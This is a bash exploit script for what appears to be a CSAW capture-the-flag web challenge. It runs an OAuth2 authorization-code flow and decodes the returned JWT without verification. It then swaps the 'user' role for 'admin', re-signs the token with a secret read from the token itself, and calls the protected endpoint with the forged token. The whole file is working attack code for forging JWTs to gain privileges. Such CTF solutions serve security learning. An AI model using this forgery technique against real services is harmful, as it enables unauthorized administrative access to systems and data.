#!/bin/bash

cl_id=1
echo "POST http://web.chal.csaw.io:9000/oauth2/authorize"
auth_key=$(curl --silent 2>&1 -X POST  http://web.chal.csaw.io:9000/oauth2/authorize --data "response_type=code&client_id=${cl_id}&redirect_uri=http://web.chal.csaw.io:9000/oauth2/token&state=123" | awk -v FS="code=|&amp;state" '{print $2}')
echo "Getting Authorization Code : ${auth_key}"
echo "POST http://web.chal.csaw.io:9000/oauth2/token (using this Authorization Code"
token=$(curl --silent 2>&1 -X POST  http://web.chal.csaw.io:9000/oauth2/token --data "grant_type=authorization_code&code=${auth_key}&client_id=${cl_id}&redirect_uri=http://web.chal.csaw.io:9000/oauth2/token")
echo "Getting Json Response : ${token}"
jwt=$(echo $token | python -c "import sys, json;data = json.load(sys.stdin);print data['token'];")
echo "Installing PyJWT python2.x library"
pip install PyJWT
echo "Extracting JWT Token : ${jwt}"
jwt_decoded=$(pyjwt decode --no-verify $jwt)
echo "Decoding JWT Token : ${jwt_decoded}"
jwt_decoded_admin=$(echo $jwt_decoded | sed -e 's/user/admin/')
echo "Replacing 'user by 'admin' : ${jwt_decoded_admin}"
secret=$(echo $jwt_decoded_admin | python -c "import sys, json;data = json.load(sys.stdin);print data['secret'];")
echo "Extracting JWT secret for signing while encoding this payload : ${secret}"
jwt_new=$(python -c "import jwt;print jwt.encode(${jwt_decoded_admin}, '${secret}', algorithm='HS256')")
echo "Generating the new JWT Token : ${jwt_new}"
verif=$(pyjwt decode --no-verify $jwt_new)
echo "Verifing the JWT Token content : ${verif}"
echo "GET http://web.chal.csaw.io:9000/protected"
echo "Response :"
curl  http://web.chal.csaw.io:9000/protected -H "Authorization: Bearer ${jwt_new}"
echo ""
